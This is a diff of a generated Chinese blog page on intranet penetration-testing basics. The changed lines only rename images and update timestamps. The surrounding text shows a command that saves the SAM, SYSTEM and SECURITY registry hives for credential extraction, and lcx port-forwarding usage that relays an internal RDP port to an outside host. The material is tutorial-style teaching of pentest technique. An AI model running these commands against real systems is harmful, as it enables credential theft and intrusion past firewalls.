@@ -172,13 +172,13 @@
 <meta property="og:site_name" content="Templeのblog">
 <meta property="og:description" content="内网渗透基础知识0x01了解一下内网的ip分配  内网常用的三种ip：A类 10.0.0.0–10.255.255.255B类 172.16.0.0–172.31.255.255C类 192.168.0.0–192.168.255.255  域控制器 域控制器是指在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器（Domain Cont">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://yoursite.com/2019/09/02/内网渗透测试基础知识/poxy.png">
-<meta property="og:image" content="http://yoursite.com/2019/09/02/内网渗透测试基础知识/poxy2.png">
-<meta property="og:updated_time" content="2019-09-02T04:12:50.772Z">
+<meta property="og:image" content="http://yoursite.com/2019/09/02/内网渗透测试基础知识/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/02/内网渗透测试基础知识/2.png">
+<meta property="og:updated_time" content="2019-09-02T05:37:02.744Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="内网渗透测试基础知识">
 <meta name="twitter:description" content="内网渗透基础知识0x01了解一下内网的ip分配  内网常用的三种ip：A类 10.0.0.0–10.255.255.255B类 172.16.0.0–172.31.255.255C类 192.168.0.0–192.168.255.255  域控制器 域控制器是指在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器（Domain Cont">
-<meta name="twitter:image" content="http://yoursite.com/2019/09/02/内网渗透测试基础知识/poxy.png">
+<meta name="twitter:image" content="http://yoursite.com/2019/09/02/内网渗透测试基础知识/1.png">
 
 
 
@@ -504,7 +504,7 @@
                 
               
 
-              <time title="创建时间：2019-09-02 11:48:48 / 修改时间：12:12:50" itemprop="dateCreated datePublished" datetime="2019-09-02T11:48:48+08:00">2019-09-02</time>
+              <time title="创建时间：2019-09-02 11:48:48 / 修改时间：13:37:02" itemprop="dateCreated datePublished" datetime="2019-09-02T11:48:48+08:00">2019-09-02</time>
             
 
             
@@ -639,8 +639,8 @@
 <p><strong>导出注册表的命令</strong></p>
 <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">reg</span> <span class="keyword">save</span> hklm\sam sam.hive &amp; <span class="keyword">reg</span> <span class="keyword">save</span> hklm\system system.hive &amp; <span class="keyword">reg</span> <span class="keyword">save</span> hklm\security security.hive</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><h4 id="内网测试中代理与端口转发"><a href="#内网测试中代理与端口转发" class="headerlink" title="内网测试中代理与端口转发"></a>内网测试中代理与端口转发</h4><h5 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a><strong>正向代理</strong></h5><p><code>Lhost ——&gt; proxy ——&gt; Rhost</code><br><img src="/2019/09/02/内网渗透测试基础知识/poxy.png" alt="正向代理"></p>
-<h5 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a><strong>反向代理</strong></h5><p><code>Lhost &lt;——&gt; proxy &lt;——&gt; firewall &lt;——&gt; Rhost</code><br><img src="/2019/09/02/内网渗透测试基础知识/poxy2.png" alt="反向代理"></p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><h4 id="内网测试中代理与端口转发"><a href="#内网测试中代理与端口转发" class="headerlink" title="内网测试中代理与端口转发"></a>内网测试中代理与端口转发</h4><h5 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a><strong>正向代理</strong></h5><p><code>Lhost ——&gt; proxy ——&gt; Rhost</code><br><img src="/2019/09/02/内网渗透测试基础知识/1.png" alt="正向代理"></p>
+<h5 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a><strong>反向代理</strong></h5><p><code>Lhost &lt;——&gt; proxy &lt;——&gt; firewall &lt;——&gt; Rhost</code><br><img src="/2019/09/02/内网渗透测试基础知识/2.png" alt="反向代理"></p>
 <h5 id="windows-lcx端口转发"><a href="#windows-lcx端口转发" class="headerlink" title="windows lcx端口转发"></a><strong>windows lcx端口转发</strong></h5><h6 id="lcx常用命令"><a href="#lcx常用命令" class="headerlink" title="lcx常用命令"></a>lcx常用命令</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1: -listen <span class="tag">&lt;<span class="name">ConnectPort1</span>&gt;</span> <span class="tag">&lt;<span class="name">TransmitPort2</span>&gt;</span></span><br><span class="line">监听p1,接收由p2转发过来的数据 </span><br><span class="line">2: -tarn <span class="tag">&lt;<span class="name">ConnectPort</span>&gt;</span> <span class="tag">&lt;<span class="name">TransmitHost</span>&gt;</span> <span class="tag">&lt;<span class="name">TransmitPort</span>&gt;</span></span><br><span class="line">端口转向功能，通过访问该端口可以直接与该主机或另一台主机的某一个端口进行通信</span><br><span class="line">3: -slave <span class="tag">&lt;<span class="name">TransmitHostB</span>&gt;</span> <span class="tag">&lt;<span class="name">PortB</span>&gt;</span> <span class="tag">&lt;<span class="name">TransmitHostA</span>&gt;</span> <span class="tag">&lt;<span class="name">PortA</span>&gt;</span> </span><br><span class="line">端口转发功能，将目标A机上的端口A,转发到外网B机的端口B上</span><br></pre></td></tr></table></figure>
 
 <p>内网上执行：<br><code>lcx.exe –slave 192.168.100.101 8888 192.168.100.111 3389</code></p>
